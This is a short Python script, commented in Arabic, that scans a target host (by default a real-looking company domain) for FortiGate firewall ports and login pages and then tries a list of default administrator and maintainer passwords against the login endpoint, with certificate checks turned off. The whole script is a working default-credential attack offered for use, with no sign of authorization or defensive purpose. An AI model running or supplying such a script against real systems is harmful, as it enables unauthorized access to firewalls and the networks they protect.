#!/usr/bin/env python3
"""
🔍 FortiGate Scanner - مستوحى من FortiBleed
يبحث عن FortiGate Firewalls ويجرب كلمات مرور افتراضية
"""
import requests, sys, socket, re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "beeorder.com"

print(f"🔍 FortiGate Scanner: {TARGET}")
print("═" * 50)

# 1. فحص منفذ FortiGate
print("\n1️⃣ منافذ FortiGate:")
for port in [443, 8443, 10443, 4443]:
    s = socket.socket(); s.settimeout(2)
    if s.connect_ex((TARGET, port)) == 0:
        print(f"   🚨 {port} مفتوح")
    s.close()

# 2. فحص صفحة الدخول
print("\n2️⃣ فحص FortiGate Login:")
try:
    r = requests.get(f"https://{TARGET}/login", timeout=5, verify=False)
    if "FortiGate" in r.text or "fortinet" in r.text.lower():
        print("   🚨 FortiGate detected!")
    else:
        print("   ❌ ليس FortiGate")
except:
    pass

# 3. كلمات مرور افتراضية
print("\n3️⃣ Default Credentials:")
creds = [("admin","admin"),("admin","password"),("admin","fortinet"),("admin",""),("maintainer","bcpb")]
for user, pwd in creds:
    try:
        r = requests.post(f"https://{TARGET}/logincheck",
            data={"username":user,"secretkey":pwd},
            timeout=5, verify=False)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"   🚨 {user}:{pwd}")
    except:
        pass

print("\n✅ اكتمل")
